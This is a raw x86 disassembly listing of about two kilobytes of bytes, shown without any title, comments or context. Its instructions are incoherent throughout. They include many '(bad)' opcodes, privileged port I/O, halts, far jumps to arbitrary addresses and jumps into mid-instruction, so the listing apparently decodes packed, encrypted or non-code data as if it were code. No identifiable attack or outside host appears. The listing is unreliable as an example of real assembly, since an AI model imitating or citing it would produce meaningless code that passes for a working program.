  415378:	adc    DWORD PTR [ecx],esi
  41537a:	inc    esp
  41537b:	adc    dh,dh
  41537d:	sub    edi,DWORD PTR ds:0x9bcf5d51
  415383:	mov    dh,0xe2
  415385:	pop    ebp
  415386:	jbe    0x415383
  415388:	rol    DWORD PTR [ebp+0x56],1
  41538b:	scas   eax,DWORD PTR es:[edi]
  41538c:	cmc    
  41538d:	ds adc al,0x2
  415390:	popf   
  415391:	je     0x4153d9
  415393:	mov    ecx,0x1877138b
  415398:	js     0x4153a2
  41539a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539b:	cmp    esi,DWORD PTR fs:[edx+ebx*1]
  41539f:	push   es
  4153a0:	in     eax,0xa4
  4153a2:	pop    ss
  4153a3:	outs   dx,BYTE PTR ds:[esi]
  4153a4:	lock or DWORD PTR [ebp-0x3d],ebx
  4153a8:	hlt    
  4153a9:	push   0x9
  4153ab:	shl    BYTE PTR [ebp-0x450aac21],0x97
  4153b2:	and    eax,0xbd7b3207
  4153b7:	cwde   
  4153b8:	jno    0x415379
  4153ba:	push   es
  4153bb:	retf   0x9f3c
  4153be:	test   DWORD PTR [esi],edi
  4153c0:	pop    ss
  4153c1:	cmp    al,0xc3
  4153c3:	mov    al,0xc1
  4153c5:	and    DWORD PTR [ecx+0x505d72ee],0x54da9fc6
  4153cf:	fcmovne st,st(5)
  4153d1:	ins    BYTE PTR es:[edi],dx
  4153d2:	add    al,0xd9
  4153d4:	arpl   bp,si
  4153d6:	(bad)  
  4153d7:	in     eax,dx
  4153d8:	cmp    dh,0x67
  4153db:	xlat   BYTE PTR ds:[ebx]
  4153dc:	call   0xe9d88800
  4153e1:	xor    edi,esi
  4153e3:	enter  0x995d,0x7f
  4153e7:	xor    eax,0xc1b62780
  4153ec:	dec    ecx
  4153ed:	or     ebp,DWORD PTR [ecx-0xf5c8174]
  4153f3:	add    esp,DWORD PTR [edi+0x95d4bca]
  4153f9:	out    dx,al
  4153fa:	adc    eax,DWORD PTR [edi]
  4153fc:	(bad)
  415401:	inc    ecx
  415402:	ins    DWORD PTR es:[edi],dx
  415403:	retf   
  415404:	dec    ebx
  415405:	outs   dx,BYTE PTR ds:[esi]
  415406:	inc    ecx
  415407:	iret   
  415408:	cmc    
  415409:	es in  eax,dx
  41540b:	adc    BYTE PTR [ebp-0x2f704e82],dh
  415411:	outs   dx,DWORD PTR ds:[esi]
  415412:	and    ch,BYTE PTR [edi]
  415414:	cli    
  415415:	addr16 pop esi
  415417:	xor    DWORD PTR [esi+0x44],0x40
  41541b:	arpl   WORD PTR [ecx-0x70],sp
  41541e:	jp     0x415418
  415420:	jmp    0xa51e:0x51721279
  415427:	imul   eax,edi,0xf63010f0
  41542d:	stos   BYTE PTR es:[edi],al
  41542e:	dec    esp
  41542f:	mov    ch,0xc6
  415431:	dec    ebp
  415432:	sbb    al,0x5f
  415434:	sbb    ecx,eax
  415436:	retf   
  415437:	and    edx,DWORD PTR [esi]
  415439:	sub    al,0xdb
  41543b:	mov    gs:0x50984a82,eax
  415441:	adc    eax,0x945b049a
  415446:	ss xor eax,0x35d17c9
  41544c:	sar    DWORD PTR [edi-0x64],0xa
  415450:	retf   
  415451:	(bad)  
  415452:	rol    bh,cl
  415454:	push   es
  415455:	sbb    BYTE PTR [ebp+0x1898a979],dh
  41545b:	(bad)  
  41545c:	or     al,0x4e
  41545e:	jne    0x4154b3
  415460:	xchg   esi,eax
  415461:	mov    ds:0x385ee59e,eax
  415466:	pop    ss
  415467:	jle    0x4154d8
  415469:	cld    
  41546a:	mov    eax,0x7386b2d1
  41546f:	psubd  mm7,QWORD PTR [ebp+0x1b]
  415473:	mov    ch,0x7f
  415475:	aas    
  415476:	dec    ebp
  415477:	or     edx,DWORD PTR [edx-0x504b27de]
  41547d:	pusha  
  41547e:	mov    ebp,0x820be802
  415483:	dec    esp
  415484:	add    bh,ah
  415486:	jns    0x415461
  415488:	aaa    
  415489:	loop   0x41542c
  41548b:	push   ebx
  41548c:	mov    eax,0xdc5e4ece
  415491:	hlt    
  415492:	les    eax,FWORD PTR [ecx+0x1d]
  415495:	popa   
  415496:	out    dx,al
  415497:	call   0x4be6:0xbd4bb49
  41549e:	std    
  41549f:	les    edi,FWORD PTR [ebp-0x35]
  4154a2:	xchg   DWORD PTR [ecx-0x3b],ebp
  4154a5:	mov    al,0x69
  4154a7:	clc    
  4154a8:	push   cs
  4154a9:	ror    DWORD PTR [ecx-0x304fd0b3],cl
  4154af:	out    dx,al
  4154b0:	push   edx
  4154b1:	jb     0x41545f
  4154b3:	jne    0x4154d0
  4154b5:	inc    esi
  4154b6:	aam    0x6b
  4154b8:	mov    esi,0x7b4d972d
  4154bd:	iret   
  4154be:	mov    ah,0x4
  4154c0:	push   ss
  4154c1:	add    eax,0xe3e89d2
  4154c6:	jbe    0x4154d5
  4154c8:	fcom   DWORD PTR [eax]
  4154ca:	pop    ds
  4154cb:	call   0x4f34e391
  4154d0:	mov    WORD PTR [edx-0x724986a8],es
  4154d6:	adc    ch,BYTE PTR [ebp+0xc0e17c7]
  4154dc:	js     0x4154e1
  4154de:	inc    esp
  4154df:	neg    DWORD PTR [edx]
  4154e1:	xlat   BYTE PTR ds:[ebx]
  4154e2:	pop    esp
  4154e3:	cwde   
  4154e4:	sahf   
  4154e5:	mov    dh,0x67
  4154e7:	fst    QWORD PTR [edi]
  4154e9:	mov    cl,0xab
  4154eb:	jl     0x415536
  4154ed:	int3   
  4154ee:	cmp    edx,DWORD PTR [edx]
  4154f0:	dec    esp
  4154f1:	test   eax,0xbcf171b4
  4154f6:	pop    eax
  4154f7:	je     0x4154f3
  4154f9:	dec    edx
  4154fa:	pop    edx
  4154fb:	xchg   ebx,eax
  4154fc:	cmp    ah,al
  4154fe:	xchg   edi,eax
  4154ff:	call   0xf761:0x9d2cb982
  415506:	popa   
  415507:	dec    ebx
  415508:	repz push cs
  41550a:	add    esi,DWORD PTR [esi-0xfab05e]
  415510:	push   ebp
  415511:	add    eax,0xb7d1225a
  415516:	sbb    esp,esi
  415518:	fsubp  st(3),st
  41551a:	test   eax,0x8d4c0393
  41551f:	xchg   esi,eax
  415520:	cli    
  415521:	dec    ebx
  415522:	push   0x9103b142
  415527:	(bad)  
  415529:	ins    DWORD PTR es:[edi],dx
  41552a:	push   esp
  41552b:	pop    edx
  41552c:	cdq    
  41552d:	int3   
  41552e:	cdq    
  41552f:	sti    
  415530:	xchg   ebp,eax
  415531:	jg     0x415520
  415533:	mov    ebx,0x1a31cee5
  415538:	dec    esi
  415539:	mov    al,0x18
  41553b:	mov    bl,0x8a
  41553d:	mov    WORD PTR [ebx],cs
  41553f:	rol    BYTE PTR ds:0xccd8a3c,0x73
  415546:	push   cs
  415547:	fisub  DWORD PTR [edx]
  415549:	sahf   
  41554a:	test   eax,0xed5d522a
  41554f:	and    BYTE PTR [edx+0x62cc47fa],0x51
  415556:	inc    edx
  415557:	push   eax
  415558:	out    0x76,al
  41555a:	push   es
  41555b:	pop    esi
  41555c:	pop    esp
  41555d:	mov    dh,0x56
  41555f:	push   0x820724ce
  415564:	std    
  415565:	test   BYTE PTR [ecx+ebx*8],dl
  415568:	(bad)  
  415569:	aaa    
  41556a:	repnz enter 0x5a13,0xe5
  41556f:	adc    DWORD PTR [eax-0x7fe77859],ebx
  415575:	jle    0x415508
  415577:	pop    ebp
  415578:	call   0x33389b8c
  41557d:	cmp    al,dl
  41557f:	push   edx
  415580:	jg     0x41559e
  415582:	stc    
  415583:	inc    edx
  415584:	jg     0x415529
  415586:	xchg   BYTE PTR [ebx+0x76bf3dba],ah
  41558c:	sbb    eax,0x5b8c1de5
  415591:	ins    DWORD PTR es:[edi],dx
  415592:	adc    dl,bl
  415594:	sbb    BYTE PTR [edx-0x5d],ch
  415597:	je     0x415581
  415599:	iret   
  41559a:	inc    eax
  41559b:	lea    ebx,ds:0x9fd2ad5d
  4155a1:	dec    eax
  4155a2:	sub    al,0x71
  4155a4:	fld    TBYTE PTR ds:0xba5080b0
  4155aa:	xchg   edi,eax
  4155ab:	mov    edx,0xc402beba
  4155b0:	and    DWORD PTR [eax+0x27],ecx
  4155b3:	and    dh,bh
  4155b5:	scas   al,BYTE PTR es:[edi]
  4155b6:	push   edx
  4155b7:	xor    ah,BYTE PTR [ecx+0x65]
  4155ba:	mov    gs,WORD PTR [ebx+0x7dddf84e]
  4155c0:	jb     0x4155c8
  4155c2:	test   BYTE PTR [ecx],dh
  4155c4:	test   BYTE PTR [ecx-0x74],ch
  4155c7:	adc    ah,BYTE PTR [ebp+0x2739e4fa]
  4155cd:	fisubr WORD PTR [eax+0x38a21c88]
  4155d3:	mov    edx,?
  4155d5:	add    DWORD PTR [edi+0x65],esp
  4155d8:	sbb    DWORD PTR [esi],ebx
  4155da:	popf   
  4155db:	push   cs
  4155dc:	call   0xaad6:0x5d83eef0
  4155e3:	ss inc esi
  4155e5:	sub    eax,0x577d9288
  4155ea:	icebp  
  4155eb:	and    edi,ebx
  4155ed:	lods   eax,DWORD PTR ds:[esi]
  4155ee:	xchg   edx,eax
  4155ef:	or     eax,0x5e811e7
  4155f4:	push   esp
  4155f5:	jecxz  0x415640
  4155f7:	xor    BYTE PTR [ebp-0x19],ch
  4155fa:	das    
  4155fb:	mov    DWORD PTR [eax-0x63],edx
  4155fe:	mov    eax,DWORD PTR [ebx-0x62dc5a90]
  415604:	pop    ebx
  415605:	jmp    0x28b67df6
  41560a:	mov    esp,0x2bb9152
  41560f:	xlat   BYTE PTR ds:[ebx]
  415610:	mov    ds:0xe5b14190,al
  415615:	retf   0x83be
  415618:	jle    0x41562b
  41561a:	jb     0x4155ef
  41561c:	adc    ebp,DWORD PTR [esi+0x5f733da1]
  415622:	push   ebx
  415623:	inc    edi
  415624:	jae    0x41568e
  415626:	loopne 0x41563a
  415628:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41562a:	sub    BYTE PTR [esi+0x36],dl
  41562d:	out    dx,al
  41562e:	adc    ebp,ecx
  415630:	pop    edi
  415631:	sbb    BYTE PTR [ebp-0x42],ah
  415634:	xor    BYTE PTR [edx+0x106c35bb],ah
  41563a:	adc    esi,esi
  41563c:	jmp    0xe3cb:0x82b07d1d
  415643:	addr16 (bad) 
  415645:	cs ins BYTE PTR es:[edi],dx
  415647:	push   cs
  415648:	pop    ss
  415649:	std    
  41564a:	neg    BYTE PTR [eax-0x4d]
  41564d:	jne    0x4155fe
  41564f:	mov    ds:0xedf48e57,eax
  415654:	mov    al,0xe2
  415656:	scas   al,BYTE PTR es:[edi]
  415657:	mov    ds:0xf0afc91d,eax
  41565c:	cli    
  41565d:	in     eax,0xe8
  41565f:	push   ds
  415660:	cld    
  415661:	loop   0x4156c5
  415663:	out    0x19,al
  415665:	and    ah,BYTE PTR [edx]
  415667:	adc    eax,0xe7a7152c
  41566c:	pop    ebp
  41566d:	dec    ecx
  41566e:	pop    eax
  41566f:	inc    ebx
  415670:	pop    ss
  415671:	sahf   
  415672:	loopne 0x4156d2
  415674:	loop   0x415652
  415676:	adc    ch,BYTE PTR ds:0x7dad2038
  41567c:	sbb    DWORD PTR ds:0x58f4eb9f,ecx
  415682:	inc    ecx
  415683:	push   ds
  415684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415685:	inc    esi
  415686:	add    DWORD PTR [esi-0x23],ecx
  415689:	push   0xe6082ba5
  41568e:	sub    DWORD PTR [edx],eax
  415690:	(bad)
  415694:	sahf   
  415695:	lods   al,BYTE PTR ds:[esi]
  415696:	lods   eax,DWORD PTR ds:[esi]
  415697:	jno    0x415688
  415699:	scas   al,BYTE PTR es:[edi]
  41569a:	lods   eax,DWORD PTR ds:[esi]
  41569b:	test   eax,0x73f76b48
  4156a0:	xchg   esi,eax
  4156a1:	add    edx,DWORD PTR [esi-0x68856836]
  4156a7:	push   0xac540646
  4156ac:	dec    eax
  4156ad:	arpl   si,dx
  4156af:	mov    esi,0xe619b06b
  4156b4:	dec    edx
  4156b5:	icebp  
  4156b6:	imul   esi,DWORD PTR gs:[ecx-0x52],0x59ac00f6
  4156be:	add    si,WORD PTR [esi-0x46029d83]
  4156c5:	out    0xda,al
  4156c7:	in     eax,dx
  4156c8:	mov    ds,WORD PTR [edi+0x20aecf7e]
  4156ce:	add    DWORD PTR [eax],esp
  4156d0:	push   ecx
  4156d1:	dec    ebp
  4156d2:	mov    WORD PTR [ecx],?
  4156d4:	out    dx,eax
  4156d5:	add    ah,BYTE PTR [ebx+0x30]
  4156d8:	cmc    
  4156d9:	fsubr  DWORD PTR [edx-0x5c]
  4156dc:	and    eax,0x7bceacbc
  4156e1:	int3   
  4156e2:	dec    edi
  4156e3:	arpl   WORD PTR [ebx-0x6d1f5f7f],ax
  4156e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ea:	fcomp  DWORD PTR [edi-0x4d]
  4156ed:	jbe    0x4156da
  4156ef:	test   al,0xef
  4156f1:	mov    ds:0x69d16509,al
  4156f6:	ins    DWORD PTR es:[edi],dx
  4156f7:	push   edx
  4156f8:	push   esi
  4156f9:	jle    0x415742
  4156fb:	cmp    dh,dh
  4156fd:	xchg   BYTE PTR [eax-0x23303037],bl
  415703:	jmp    0x415759
  415705:	mov    edi,esp
  415707:	lock enter 0x1c53,0x1d
  41570c:	popa   
  41570d:	xor    eax,0xbf468d25
  415712:	adc    cl,BYTE PTR [edi-0x3f]
  415715:	add    cl,BYTE PTR [esi+0x103ce56d]
  41571b:	lods   al,BYTE PTR ds:[esi]
  41571c:	sub    al,0xd1
  41571e:	sar    al,1
  415720:	lock ss stc 
  415723:	stc    
  415724:	aad    0xdb
  415726:	xchg   DWORD PTR [esi],ecx
  415728:	adc    BYTE PTR [esi-0x11],ah
  41572b:	jmp    0xe3bb:0x3c55c585
  415732:	rcl    DWORD PTR [ebx+0x7f],cl
  415735:	fld    TBYTE PTR ds:0xc017c0a3
  41573b:	repnz iret 
  41573d:	jecxz  0x41574c
  41573f:	cmp    al,0x33
  415741:	repnz pop ebx
  415743:	add    BYTE PTR [eax-0x13fdbac3],bh
  415749:	push   cs
  41574a:	ror    dh,0xf8
  41574d:	inc    edx
  41574e:	push   esi
  41574f:	ds addr16 push cs
  415752:	out    dx,al
  415753:	div    DWORD PTR [ebx-0x5b88e559]
  415759:	ja     0x415755
  41575b:	stos   DWORD PTR es:[edi],eax
  41575c:	fistp  DWORD PTR [ebp-0x218ecd84]
  415762:	cmp    al,0x1d
  415764:	icebp  
  415765:	lods   al,BYTE PTR ds:[esi]
  415766:	push   esp
  415767:	mov    dh,0xfd
  415769:	inc    esp
  41576a:	mov    al,ds:0x439c4978
  41576f:	fiadd  DWORD PTR [eax-0x41]
  415772:	xchg   esi,eax
  415773:	mov    al,ds:0xe8032179
  415778:	in     al,0xfd
  41577a:	mov    ah,0x30
  41577c:	addr16 lock push 0xafaa7595
  415783:	jp     0x415734
  415785:	ds jecxz 0x415802
  415788:	test   al,0x5b
  41578a:	in     eax,0x9e
  41578c:	ja     0x415808
  41578e:	mov    esi,0xf3e693b0
  415793:	cdq    
  415794:	ins    BYTE PTR es:[edi],dx
  415795:	pop    eax
  415796:	sahf   
  415797:	xor    al,0x9e
  415799:	pop    ss
  41579a:	call   0x69b456de
  41579f:	xor    cl,dh
  4157a1:	and    BYTE PTR [edx-0x6e7b4d7b],dl
  4157a7:	sbb    bh,BYTE PTR [edx-0x44]
  4157aa:	dec    edx
  4157ab:	fs mov dl,bh
  4157ae:	sbb    esp,0xaca71196
  4157b4:	push   0xefb01755
  4157b9:	mov    ebx,0xebe7af1e
  4157be:	enter  0xd8ab,0x2a
  4157c2:	push   ecx
  4157c3:	imul   ebx,DWORD PTR ds:0xe59ae1c7,0xcf592b65
  4157cd:	xor    ebp,DWORD PTR [eax-0x35]
  4157d0:	add    ebp,DWORD PTR [ebx]
  4157d2:	in     al,dx
  4157d3:	jnp    0x415796
  4157d5:	gs pushf 
  4157d7:	xadd   DWORD PTR [edi-0x52],esp
  4157db:	mov    dh,0xdd
  4157dd:	mov    ebx,0x9346196f
  4157e2:	jmp    0xb1ac064f
  4157e7:	(bad)  [eax+eiz*1-0x5a]
  4157eb:	inc    ebx
  4157ec:	stc    
  4157ed:	sti    
  4157ee:	call   0x1d18d72d
  4157f3:	out    dx,eax
  4157f4:	and    DWORD PTR [edi+eiz*8+0x6c],eax
  4157f8:	sub    al,0x75
  4157fa:	dec    ebx
  4157fb:	cdq    
  4157fc:	inc    ebp
  4157fd:	sub    edi,DWORD PTR [ebp-0x7a]
  415800:	xchg   edi,eax
  415801:	dec    edi
  415802:	pop    es
  415803:	bound  esp,QWORD PTR ds:0x382427d
  415809:	cmc    
  41580a:	retf   0xc67c
  41580d:	push   ds
  41580e:	pop    ebp
  41580f:	mov    ah,0x5c
  415811:	je     0x41579e
  415813:	inc    ecx
  415814:	pop    esi
  415815:	cld    
  415816:	(bad)  
  415817:	(bad)  [esi-0x74]
  41581a:	pop    ds
  41581b:	xchg   ecx,eax
  41581c:	popa   
  41581d:	outs   dx,BYTE PTR ds:[esi]
  41581e:	fnop   
  415820:	repnz aad 0x4b
  415823:	es cdq 
  415825:	add    al,BYTE PTR [ebx]
  415827:	sbb    BYTE PTR [ebp-0x3c],cl
  41582a:	mov    ds:0x978e8c7d,al
  41582f:	and    eax,DWORD PTR [edi+0x71]
  415832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415833:	cmp    al,0x60
  415835:	push   ecx
  415836:	sbb    eax,DWORD PTR [edx]
  415838:	loopne 0x4157d9
  41583a:	mov    DWORD PTR [ebp-0x6b],esp
  41583d:	pop    esi
  41583e:	aaa    
  41583f:	sub    cx,bx
  415842:	adc    BYTE PTR [edi+0x62],0x27
  415846:	pop    eax
  415847:	jo     0x4158b3
  415849:	sbb    edx,ebp
  41584b:	mov    eax,0x93bbdbe6
  415850:	sub    DWORD PTR [ebx+0x52bd29d9],eax
  415856:	fnsave [ecx]
  415858:	push   ss
  415859:	in     eax,0xe1
  41585b:	sub    BYTE PTR [edx],0x8d
  41585e:	mov    ecx,0xc581f48
  415863:	add    al,0x28
  415865:	cwde   
  415866:	add    BYTE PTR [eax+0x7e],dl
  415869:	cmp    esi,esi
  41586b:	dec    ebx
  41586c:	add    edx,ebx
  41586e:	and    al,0x7f
  415870:	fisttp DWORD PTR [ebx+0x77f709c3]
  415876:	popa   
  415877:	mov    ds:0xeb4fc9b1,eax
  41587c:	sub    al,0xb6
  41587e:	xchg   ebx,eax
  41587f:	push   ss
  415880:	not    ebp
  415882:	scas   al,BYTE PTR es:[edi]
  415883:	or     BYTE PTR [ecx],ch
  415885:	mov    esp,0x71c2401a
  41588a:	sahf   
  41588b:	hlt    
  41588c:	push   ds
  41588d:	mov    ch,0xcb
  41588f:	jo     0x415829
  415891:	inc    edi
  415892:	mov    eax,0x38ef84d2
  415897:	hlt    
  415898:	outs   dx,DWORD PTR ds:[esi]
  415899:	imul   edi,DWORD PTR [ebp-0x79756a29],0x8c938f02
  4158a3:	int3   
  4158a4:	lahf   
  4158a5:	ret    
  4158a6:	ror    ch,0xbf
  4158a9:	fbstp  TBYTE PTR ds:0x98d0c2e9
  4158af:	int    0x59
  4158b1:	sar    BYTE PTR [eax+0x83022ae],1
  4158b7:	mov    esi,0xd5b3a506
  4158bc:	popa   
  4158bd:	inc    esp
  4158be:	ins    BYTE PTR es:[edi],dx
  4158bf:	jecxz  0x41586d
  4158c1:	dec    ecx
  4158c2:	xor    ebx,edi
  4158c4:	fst    QWORD PTR [edx+0x5d]
  4158c7:	push   ecx
  4158c8:	leave  
  4158c9:	shl    BYTE PTR [ecx],0x30
  4158cc:	cmp    al,0xf
  4158ce:	add    esp,esp
  4158d0:	pop    esp
  4158d1:	in     eax,dx
  4158d2:	repnz leave 
  4158d4:	fdivr  DWORD PTR [ecx+0x155bc81e]
  4158da:	je     0x4158c4
  4158dc:	loop   0x415867
  4158de:	ja     0x4158d6
  4158e0:	xor    edx,DWORD PTR [esi+0x3b]
  4158e3:	mov    al,0x9c
  4158e5:	stos   DWORD PTR es:[edi],eax
  4158e6:	jecxz  0x415919
  4158e8:	loop   0x415886
  4158ea:	inc    esp
  4158eb:	jle    0x4158cc
  4158ed:	and    eax,0xcb1efeb
  4158f2:	or     al,0x8e
  4158f4:	jecxz  0x41591d
  4158f6:	xor    al,0xf7
  4158f8:	sbb    ch,ch
  4158fa:	das    
  4158fb:	shl    dh,cl
  4158fd:	mov    eax,0x496b839
  415902:	pushw  ss
  415904:	pop    ss
  415905:	loopne 0x415891
  415907:	call   DWORD PTR [ebp+0x58a3f11b]
  41590d:	sub    al,0xca
  41590f:	mov    ds:0x6e43d7f5,al
  415914:	fld    QWORD PTR [ebp-0x75]
  415917:	xor    al,0x9c
  415919:	imul   esp,DWORD PTR [eax],0x2c
  41591c:	inc    eax
  41591d:	mov    ch,0xfd
  41591f:	push   cs
  415920:	repnz scas eax,DWORD PTR es:[edi]
  415922:	push   ebp
  415923:	cmp    cl,BYTE PTR [edi+0x5d]
  415926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415928:	push   esp
  415929:	push   ss
  41592a:	ss out dx,al
  41592c:	mov    dl,BYTE PTR [esi]
  41592e:	xchg   BYTE PTR [ebp-0x2e],al
  415931:	jae    0x4158f0
  415933:	rol    bh,cl
  415935:	std    
  415936:	ret    0x4c76
  415939:	add    ch,0xc8
  41593c:	add    eax,0x303d9e87
  415941:	aam    0x3
  415943:	in     eax,0xd0
  415945:	fwait
  415946:	mov    WORD PTR [ecx],?
  415948:	jae    0x41597e
  41594a:	mov    cl,0xcd
  41594d:	pause  
  41594f:	xor    al,0x8f
  415951:	jae    0x7362f800
  415957:	dec    ecx
  415958:	xor    ebx,DWORD PTR [eax]
  41595a:	or     DWORD PTR [edx+edx*4],esp
  41595d:	push   esi
  41595e:	push   ecx
  41595f:	xchg   esp,eax
  415960:	retf   0x35c5
  415963:	inc    edi
  415964:	cs dec edi
  415966:	aaa    
  415967:	pop    ds
  415968:	imul   eax,edx,0x20
  41596b:	sbb    DWORD PTR [edi+0x64],0xfffffff0
  41596f:	and    ah,ah
  415971:	xor    bh,BYTE PTR ds:0xb92190c0
  415977:	iret   
  415978:	dec    edi
  415979:	int    0xa4
  41597b:	inc    esi
  41597c:	ror    DWORD PTR [ebx],0xf9
  41597f:	adc    esp,DWORD PTR [edi+0x3a71e04f]
  415985:	std    
  415986:	mov    es,edx
  415988:	or     BYTE PTR [ecx+esi*4+0x78],cl
  41598c:	int3   
  41598d:	mov    ?,WORD PTR [ecx]
  41598f:	xor    esi,edi
  415991:	jge    0x415943
  415993:	imul   esp,DWORD PTR ds:[edx+0x4be58c24],0xeef66da1
  41599e:	stos   DWORD PTR es:[edi],eax
  41599f:	xchg   ah,dl
  4159a1:	enter  0xe816,0x8
  4159a5:	pop    ss
  4159a6:	popa   
  4159a7:	cld    
  4159a8:	outs   dx,BYTE PTR ds:[esi]
  4159a9:	push   esi
  4159aa:	cdq    
  4159ab:	mov    esp,0x69fda8fb
  4159b0:	cmp    edx,ebp
  4159b2:	adc    BYTE PTR [ecx+0x2c],ch
  4159b5:	aas    
  4159b6:	dec    ebp
  4159b7:	jns    0x415a15
  4159b9:	lahf   
  4159ba:	jge    0x415a31
  4159bc:	fmulp  st(7),st
  4159be:	test   al,0x59
  4159c0:	mov    ecx,DWORD PTR [eax-0x33]
  4159c3:	cmp    esp,ebx
  4159c5:	sbb    cl,BYTE PTR [ebx+0x639f7a90]
  4159cb:	add    BYTE PTR [ebp+0x7b72c64a],ah
  4159d1:	dec    edi
  4159d2:	adc    DWORD PTR [edi-0x4d19f0c3],eax
  4159d8:	sbb    al,0xf5
  4159da:	add    edx,0x6f
  4159dd:	push   ds
  4159de:	pop    ebx
  4159df:	xchg   DWORD PTR [esp+esi*1-0x50],esp
  4159e3:	addr16 xchg edx,eax
  4159e5:	hlt    
  4159e6:	inc    edi
  4159e7:	in     eax,0xae
  4159e9:	test   al,0x29
  4159eb:	sbb    eax,0x8e544b3d
  4159f1:	mov    esi,0xcab21d42
  4159f6:	push   0xa5239dfd
  4159fb:	add    ch,BYTE PTR [edi-0x18]
  4159fe:	sbb    DWORD PTR [ebx+0x56264b12],edi
  415a04:	mov    edx,0x42669f28
  415a09:	sub    BYTE PTR [ebx-0x21dbba69],ah
  415a0f:	int3   
  415a10:	and    BYTE PTR [ecx-0x76],al
  415a13:	cwde   
  415a14:	test   BYTE PTR [edi-0x80],bl
  415a17:	retf   0x57c9
  415a1a:	mov    dh,0x10
  415a1c:	add    BYTE PTR [eax],cl
  415a1e:	sbb    eax,0x197f3181
  415a23:	sahf   
  415a24:	jmp    0x3c236a7d
  415a29:	cli    
  415a2a:	js     0x415a32
  415a2c:	push   ebx
  415a2d:	adc    eax,0xc8d298dc
  415a32:	jle    0x415a8e
  415a34:	dec    edx
  415a35:	sbb    BYTE PTR [edx-0x6c2d0f57],bl
  415a3b:	scas   eax,DWORD PTR es:[edi]
  415a3c:	je     0x4159d2
  415a3e:	jmp    0xb7ea:0x61e27fa4
  415a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a46:	fistp  DWORD PTR [ebx+edx*4+0xcb16f9]
  415a4d:	rcl    DWORD PTR [esi-0x25],cl
  415a50:	xchg   DWORD PTR [ebx-0x326adf58],eax
  415a56:	xchg   ebp,eax
  415a57:	out    0xbf,eax
  415a59:	jnp    0x4159e9
  415a5b:	daa    
  415a5c:	add    eax,DWORD PTR [edx]
  415a5e:	iret   
  415a5f:	stos   DWORD PTR es:[edi],eax
  415a60:	aam    0xb
  415a62:	inc    edx
  415a63:	pusha  
  415a64:	mov    dl,0x15
  415a66:	(bad)  
  415a67:	fdiv   DWORD PTR [eax+0x47]
  415a6a:	mov    cs,edi
  415a6c:	or     DWORD PTR [ecx],edi
  415a6e:	sub    eax,DWORD PTR [ebx]
  415a70:	lea    eax,[eax+0x5a]
  415a73:	sbb    eax,0x5d4ca78d
  415a78:	mov    cl,0x16
  415a7a:	or     ah,BYTE PTR ds:0xf2ffab32
  415a80:	popf   
  415a81:	or     BYTE PTR [ecx],ah
  415a83:	in     eax,0xd6
  415a85:	(bad)  
  415a86:	fcom   QWORD PTR [edx]
  415a88:	mov    DWORD PTR [eax+0x6ed97074],esi
  415a8e:	fst    QWORD PTR [ecx-0x37]
  415a91:	cmp    eax,DWORD PTR [edx]
  415a93:	push   0xffffffef
  415a95:	cmp    eax,0xf11e0efb
  415a9a:	lods   eax,DWORD PTR ds:[esi]
  415a9b:	imul   esi,DWORD PTR [ecx],0xdb7e1b11
  415aa1:	jg     0x415a9f
  415aa3:	popf   
  415aa4:	pop    ds
  415aa5:	pop    edx
  415aa6:	(bad)  
  415aa7:	push   edi
  415aa8:	sbb    BYTE PTR [edi],dl
  415aaa:	and    eax,0xd6481abe
  415aaf:	xchg   ecx,eax
  415ab0:	pop    ebp
  415ab1:	mov    bh,0x81
  415ab3:	or     ecx,DWORD PTR [edx+0x327bb011]
  415ab9:	pushf  
  415aba:	or     dh,dh
  415abc:	xchg   esp,eax
  415abd:	adc    esp,DWORD PTR [edi+eax*2]
  415ac0:	bound  ecx,QWORD PTR [esp+eax*4-0x11]
  415ac4:	push   0x2cc7844d
  415ac9:	jo     0x415ac9
  415acb:	or     BYTE PTR [esi+edx*2-0x63],cl
  415acf:	rol    DWORD PTR [esi],1
  415ad1:	test   al,0xef
  415ad3:	inc    ecx
  415ad4:	adc    BYTE PTR [eax],0x95
  415ad7:	mov    esi,0xbe68601a
  415adc:	dec    esi
  415add:	pop    edx
  415ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415adf:	sti    
  415ae0:	pop    edx
  415ae1:	xchg   ecx,eax
  415ae2:	ror    BYTE PTR [ebp+eax*8+0x74],1
  415ae6:	push   0xdad68357
  415aeb:	mov    bl,0x61
  415aed:	inc    eax
  415aee:	leave  
  415aef:	sbb    al,0x3f
  415af1:	sti    
  415af2:	jmp    0xdf0d0030
  415af7:	xchg   edx,eax
  415af8:	cmp    eax,DWORD PTR [edi-0x640fd058]
  415afe:	repnz hlt 
  415b00:	adc    ebx,0x46
  415b03:	pop    ss
  415b04:	mov    edi,0x776995cf
  415b09:	sbb    BYTE PTR [edi],bh
  415b0b:	fisub  WORD PTR [ecx+ebx*2+0x4ea6554c]
  415b12:	aad    0x9b
  415b14:	imul   ebp,ebp,0xffffffa4
  415b17:	not    dl
  415b19:	ins    BYTE PTR es:[edi],dx
  415b1a:	adc    BYTE PTR [ecx-0x97f898a],0xe9
  415b21:	call   0x79f8:0x25098262
  415b28:	mov    edi,0xed7f9a7
  415b2d:	jbe    0x415bae
  415b2f:	sub    BYTE PTR [edi],ch
  415b31:	dec    esi
  415b32:	pop    ss
  415b33:	std    
  415b34:	arpl   dx,ax
  415b36:	cld    
  415b37:	push   esp
  415b38:	or     DWORD PTR [ebx],esi
  415b3a:	push   eax
  415b3b:	imul   bl
  415b3d:	mov    ch,0xb8
  415b3f:	jmp    DWORD PTR [esi-0x38]
  415b42:	stos   DWORD PTR es:[edi],eax
  415b43:	jnp    0x415b4c
  415b45:	xor    al,0x9b
  415b47:	inc    esi
  415b48:	jns    0x415b9f
  415b4a:	gs ret 
  415b4c:	int    0xa6
  415b4e:	jmp    0x2c37562
  415b53:	aad    0x3a
  415b55:	imul   eax,DWORD PTR [edx],0xffffffe4
  415b58:	sub    eax,0xd2376ded
  415b5d:	jmp    0xb2e9:0x5e30de78
  415b64:	je     0x415b78
  415b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b67:	add    eax,0x3deb66e9
